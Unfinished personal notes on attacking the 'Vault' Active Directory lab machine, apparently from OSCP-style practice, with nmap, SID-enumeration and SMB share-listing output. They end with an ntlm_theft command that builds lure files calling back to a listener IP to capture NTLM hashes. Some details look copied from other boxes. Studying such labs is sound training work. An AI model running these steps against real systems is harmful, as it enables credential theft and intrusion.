Info:
IP: 192.168.157.172
OS:
Domain: vault.offsec

Links:
```bash
https://medium.com/@Dpsypher/proving-grounds-practice-vault-158516460860
https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/vault
```
Standard enum:

# NMAP
```bash
nmap -p- -sCV 192.168.157.172 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 20:23 EDT
Nmap scan report for 192.168.157.172
Host is up (0.044s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 00:25:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-11T00:26:31+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-11T00:25:51+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-10-10T00:19:57
|_Not valid after:  2026-04-11T00:19:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49830/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-11T00:25:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

# Worth checking:
```bash
139, 445 - smb
389, 636, 3268, 3269 - LDAP
5985 - WinRM
9389 - ?
```

Lets try to enum users with LDAP:
```bash
impacket-lookupsid guest@vault.pgp -no-pass

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at vault.pgp
[*] StringBinding ncacn_np:vault.pgp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-537427935-490066102-1511301751
498: VAULT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VAULT\Administrator (SidTypeUser)
501: VAULT\Guest (SidTypeUser)
502: VAULT\krbtgt (SidTypeUser)
512: VAULT\Domain Admins (SidTypeGroup)
513: VAULT\Domain Users (SidTypeGroup)
514: VAULT\Domain Guests (SidTypeGroup)
515: VAULT\Domain Computers (SidTypeGroup)
516: VAULT\Domain Controllers (SidTypeGroup)
517: VAULT\Cert Publishers (SidTypeAlias)
518: VAULT\Schema Admins (SidTypeGroup)
519: VAULT\Enterprise Admins (SidTypeGroup)
520: VAULT\Group Policy Creator Owners (SidTypeGroup)
521: VAULT\Read-only Domain Controllers (SidTypeGroup)
522: VAULT\Cloneable Domain Controllers (SidTypeGroup)
525: VAULT\Protected Users (SidTypeGroup)
526: VAULT\Key Admins (SidTypeGroup)
527: VAULT\Enterprise Key Admins (SidTypeGroup)
553: VAULT\RAS and IAS Servers (SidTypeAlias)
571: VAULT\Allowed RODC Password Replication Group (SidTypeAlias)
572: VAULT\Denied RODC Password Replication Group (SidTypeAlias)
1000: VAULT\DC$ (SidTypeUser)
1101: VAULT\DnsAdmins (SidTypeAlias)
1102: VAULT\DnsUpdateProxy (SidTypeGroup)
1103: VAULT\anirudh (SidTypeUser)
```

Now maybe enum4linux
```bash
$ enum4linux-ng vault.pgp  
```

nothing special, check smb
```bash
crackmapexec smb vault.pgp -u 'quest' -p ''  --shares

SMB         vault.pgp       445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB         vault.pgp       445    DC               [+] vault.offsec\quest: 
SMB         vault.pgp       445    DC               [+] Enumerated shares
SMB         vault.pgp       445    DC               Share           Permissions     Remark
SMB         vault.pgp       445    DC               -----           -----------     ------
SMB         vault.pgp       445    DC               ADMIN$                          Remote Admin
SMB         vault.pgp       445    DC               C$                              Default share
SMB         vault.pgp       445    DC               DocumentsShare  READ,WRITE      
SMB         vault.pgp       445    DC               IPC$            READ            Remote IPC
SMB         vault.pgp       445    DC               NETLOGON                        Logon server share 
SMB         vault.pgp       445    DC               SYSVOL                          Logon server share 
```
Bingo!

ntlm_theft ? 
python3 ~/GitHub/ntlm_theft/ntlm_theft.py --generate all --server 10.10.14.245 --filename flight
go with dsypher